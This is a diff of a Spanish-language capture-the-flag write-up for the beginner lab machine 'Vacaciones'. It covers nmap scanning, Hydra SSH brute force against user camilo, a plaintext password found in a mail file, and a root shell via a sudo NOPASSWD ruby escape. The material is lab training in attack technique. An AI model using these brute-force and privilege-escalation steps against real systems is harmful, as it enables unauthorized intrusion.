@@ -1,14 +1,13 @@
-# 🖥️ **Máquina: Vacaciones**
-
+# 🖥️ **Máquina: Vacaciones**  
 - **🔹 Dificultad:** Muy Fácil  
 - **📌 Descripción:**  
-  Laboratorio enfocado en practicar técnicas de reconocimiento, ataque de fuerza bruta a SSH y escalada de privilegios. Ideal para principiantes en el mundo del pentesting y CTFs.
+  Laboratorio enfocado en practicar técnicas de reconocimiento, ataque de fuerza bruta a SSH y escalada de privilegios. Ideal para principiantes en pentesting y CTFs.  
 
 - **🎯 Objetivo:**  
   - Enumerar servicios expuestos.
   - Acceder mediante fuerza bruta SSH.
-  - Realizar cambio de usuario vía nueva sesión SSH.
-  - Escalar privilegios a `root`.
+  - Cambio de usuario vía nueva sesión SSH.
+  - Escalada de privilegios a `root`.
 
 ![Despliegue](/Vacaciones/Imagenes/Plantilla.png)
 
@@ -18,22 +17,16 @@
 
 ### 1️⃣ Preparar el entorno
 
-Descomprimimos el archivo `.zip` con:
+Descomprimir y desplegar:
 
 ```bash
 7z e vacaciones.zip
-```
-
-Y desplegamos el contenedor:
-
-```bash
 sudo bash auto_deploy.sh vacaciones.tar
 ```
 
-📌 **Nota:** IP asignada: `172.17.0.2`.
+- **IP asignada**: `172.17.0.2`
 
-📸 **Captura:**
-
+📸 **Captura:**  
 ![Despliegue](/Vacaciones/Imagenes/Activo.jpeg)
 
 ---
@@ -46,62 +39,67 @@ sudo bash auto_deploy.sh vacaciones.tar
 ping -c4 172.17.0.2
 ```
 
-📸 **Captura:**
-
+📸 **Captura:**  
 ![Ping](/Vacaciones/Imagenes/Ping.jpeg)
 
 ---
 
 ## 🌐 **Enumeración Web**
 
-Realizamos una primera consulta HTTP:
+Accedemos al servidor web usando `curl`:
 
 ```bash
 curl http://172.17.0.2
 ```
 
-Obtenemos un mensaje oculto:
+**¿Qué hace `curl` aquí?**  
+- `curl` permite hacer **una petición HTTP manual** al servidor.
+- En vez de usar un navegador, `curl` muestra **todo el contenido HTML crudo**.
+- Esto ayuda a encontrar comentarios ocultos, cabeceras especiales o información sensible que no se muestra normalmente.
 
-```
+**Resultado obtenido**:
+```html
 <!-- De : Juan Para: Camilo , te he dejado un correo es importante... -->
 ```
 
-📸 **Captura:**
-
+📸 **Captura:**  
 ![Página Web](/Vacaciones/Imagenes/Pagina.jpeg)
+
+**Conclusión**:  
+Hay **un mensaje oculto en el código fuente** indicando que Camilo recibió un correo importante.
 
 ---
 
 ## 🔍 **Escaneo de Puertos**
 
-Escaneo rápido con `nmap`:
+Escaneo rápido de todos los puertos:
 
 ```bash
 sudo nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts.txt
 ```
 
-Resultados:
-
+**Resultados**:
 - Puerto **22**: SSH
 - Puerto **80**: HTTP
 
-📸 **Captura:**
-
+📸 **Captura:**  
 ![Puertos Abiertos](/Vacaciones/Imagenes/Puertos.jpeg)
 
+---
+
 ### 3️⃣ Detección de Servicios
+
+Escaneo detallado:
 
 ```bash
 nmap -sC -sV -p 22,80 172.17.0.2 -oN target.txt
 ```
 
-Servicios:
+Servicios detectados:
+- **SSH**: OpenSSH 7.6p1
+- **HTTP**: Apache 2.4.29
 
-- SSH → OpenSSH 7.6p1
-- HTTP → Apache 2.4.29
-
-📸 **Captura:**
-
+📸 **Captura:**  
 ![Servicios Detectados](/Vacaciones/Imagenes/Servicios.jpeg)
 
 ---
@@ -119,68 +117,65 @@ Servicios:
 
 ### 4️⃣ Uso de Hydra
 
-Realizamos fuerza bruta con `hydra`:
+Realizamos un ataque de fuerza bruta al servicio SSH:
 
 ```bash
 hydra -l camilo -P /usr/share/wordlists/rockyou.txt ssh://172.17.0.2 -t20
 ```
 
-📸 **Captura:**
-
+📸 **Captura:**  
 ![Hydra](/Vacaciones/Imagenes/Hydra.jpeg)
 
 ✅ Resultado:
-
-- **Usuario:** camilo
-- **Contraseña:** password1
+- **Usuario**: `camilo`
+- **Contraseña**: `password1`
 
 ---
 
 ## 🧑‍💻 **Acceso SSH como Camilo**
 
-Ingresamos vía SSH:
+Conexión SSH:
 
 ```bash
 ssh camilo@172.17.0.2
 ```
 
-📸 **Captura:**
-
+📸 **Captura:**  
 ![Contraseña](/Vacaciones/Imagenes/Contraseña.jpeg)
 
-✅ Conexión exitosa.
+✅ Acceso exitoso.
 
 ---
 
 ## 📜 **Exploración de archivos internos**
 
-Dentro del sistema:
+Dentro de la máquina:
 
 ```bash
 cd /var/mail/camilo
 cat correo.txt
 ```
 
-Contenido del archivo:
+**Contenido**:
 
-```
+```text
 Hola Camilo,
 
-Me voy de vacaciones y no he terminado el trabajo que me dio el jefe. Por si acaso lo pide, aquí tienes la contraseña: 2k84dicb
+Me voy de vacaciones y no he terminado el trabajo que me dio el jefe. 
+Por si acaso lo pide, aquí tienes la contraseña: 2k84dicb
 ```
 
-✅ Hemos encontrado **una nueva contraseña**.
+✅ Encontramos **una nueva contraseña**.
 
 ---
 
 ## 🔑 **Nuevo login SSH como Juan**
 
-En lugar de cambiar de usuario, **cerramos sesión SSH de camilo** y abrimos una **nueva conexión SSH**, esta vez como **juan**:
+**Cerrar sesión de Camilo** y **conectarse como Juan**:
 
 ```bash
 ssh juan@172.17.0.2
 ```
-
 Contraseña: `2k84dicb`
 
 ✅ Acceso correcto como **juan**.
@@ -189,21 +184,38 @@ Contraseña: `2k84dicb`
 
 ## 🧗 **Escalada de Privilegios a Root**
 
-Listamos los permisos de `sudo`:
+Listamos los permisos `sudo`:
 
 ```bash
 sudo -l
 ```
 
-Vemos que **juan** puede ejecutar `sudo` sin necesidad de contraseña.
+Resultado:
 
-Escalamos:
-
-```bash
-sudo su
+```
+User juan may run the following commands on 2b9b77c590b9:
+    (ALL) NOPASSWD: /usr/bin/ruby
 ```
 
-✅ Ahora tenemos privilegios de **root**.
+✅ **Juan puede ejecutar `/usr/bin/ruby` como root sin contraseña**.
+
+---
+
+### 📈 **Escalada usando Ruby**
+
+Como Juan puede usar Ruby como root, **escalamos privilegios** ejecutando:
+
+```bash
+sudo /usr/bin/ruby -e 'exec "/bin/bash"'
+```
+
+**Explicación del comando**:
+- `sudo` → Ejecutamos como root.
+- `/usr/bin/ruby` → Usamos Ruby, autorizado sin contraseña.
+- `-e` → Ejecutamos el siguiente código Ruby:
+- `'exec "/bin/bash"'` → Ruby reemplaza su proceso actual por una **shell bash como root**.
+
+✅ Ahora tenemos **una consola root**.
 
 ---
 
@@ -213,7 +225,7 @@ sudo su
 |:--------|:-----------|:---------------------------------|
 | camilo  | password1  | Hydra + SSH                      |
 | juan    | 2k84dicb   | Contraseña encontrada + SSH      |
-| root    | N/A        | `sudo su` desde Juan              |
+| root    | N/A        | `sudo ruby` y ejecución de bash  |
 
 ---
 
@@ -225,25 +237,20 @@ sudo su
 | **hydra**   | Fuerza bruta | Obtener acceso SSH explotando contraseñas débiles |
 | **ssh**     | Conexión segura | Acceso remoto a los usuarios |
 | **sudo**    | Escalada de privilegios | Obtener permisos de superusuario |
-| **curl**    | Peticiones HTTP | Extracción de mensajes ocultos |
+| **curl**    | Peticiones HTTP | Extracción de mensajes ocultos en HTML |
 
 ---
 
 # 📚 **Conclusiones**
 
 Esta máquina refuerza conceptos básicos como:
-
 - Enumeración de servicios.
 - Ataques de fuerza bruta con `hydra`.
 - Búsqueda de información en archivos del sistema.
 - Accesos multiusuario vía SSH.
-- Escalada de privilegios basada en mala configuración de `sudo`.
+- Escalada de privilegios usando configuración insegura de `sudo`.
 
-Además, resalta buenas prácticas como:
+**Buenas prácticas recordadas**:
 - No usar contraseñas débiles.
-- No dejar información sensible accesible (como correos internos).
-- Restringir el acceso de `sudo` solo a usuarios administradores.
-
----
-
-
+- No dejar información sensible expuesta en sistemas públicos.
+- Limitar estrictamente el uso de `sudo`.
